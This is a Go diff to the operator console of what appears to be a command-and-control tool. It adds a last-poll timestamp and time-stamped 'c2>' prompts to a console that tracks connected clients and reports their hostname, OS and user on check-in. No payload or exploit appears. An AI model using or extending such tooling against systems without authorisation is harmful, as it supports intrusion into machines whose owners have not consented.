@@ -33,6 +33,7 @@ type Operator struct {
 	pendingSeqs      map[int]string        // seq -> module name
 	connectedClients map[string]ClientInfo  // client_id -> info
 	pollBackoff      time.Duration         // 0 = normal, >0 = rate limited
+	lastPoll         time.Time             // timestamp of last successful poll
 }
 
 // NewOperator creates a new operator.
@@ -149,6 +150,7 @@ func (op *Operator) checkForCheckins() bool {
 		return false
 	}
 	op.pollBackoff = 0 // reset on success
+	op.lastPoll = time.Now()
 	if len(results) > 0 {
 		seqs := make([]int, 0, len(results))
 		for s := range results {
@@ -158,7 +160,7 @@ func (op *Operator) checkForCheckins() bool {
 		for _, s := range seqs {
 			fmt.Println()
 			displayResult(s, results[s])
-			fmt.Print("c2> ")
+			fmt.Printf("[%s] c2> ", time.Now().Format("15:04"))
 		}
 		return true
 	}
@@ -211,7 +213,7 @@ func (op *Operator) Interactive() {
 	scanner := bufio.NewScanner(os.Stdin)
 
 	for {
-		fmt.Print("c2> ")
+		fmt.Printf("[%s] c2> ", time.Now().Format("15:04"))
 		if !scanner.Scan() {
 			fmt.Println("\n[*] Exiting")
 			break
@@ -326,6 +328,13 @@ func (op *Operator) printStatus() {
 		fmt.Println("[*] No pending commands")
 	}
 	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
+	if !op.lastPoll.IsZero() {
+		ago := time.Since(op.lastPoll).Truncate(time.Second)
+		fmt.Printf("[*] Last poll: %s (%s ago)\n",
+			op.lastPoll.Format("15:04:05"), ago)
+	} else {
+		fmt.Println("[*] Last poll: never")
+	}
 }
 
 func (op *Operator) handleCheckin(result map[string]interface{}) {
@@ -369,8 +378,9 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		"    hostname  : %s\n"+
 		"    os        : %s\n"+
 		"    user      : %s\n"+
-		"    timestamp : %s\n\nc2> ",
-		clientID, hostname, osInfo, user, timestamp)
+		"    timestamp : %s\n\n[%s] c2> ",
+		clientID, hostname, osInfo, user, timestamp,
+		time.Now().Format("15:04"))
 }
 
 func displayResult(seq int, result map[string]interface{}) {
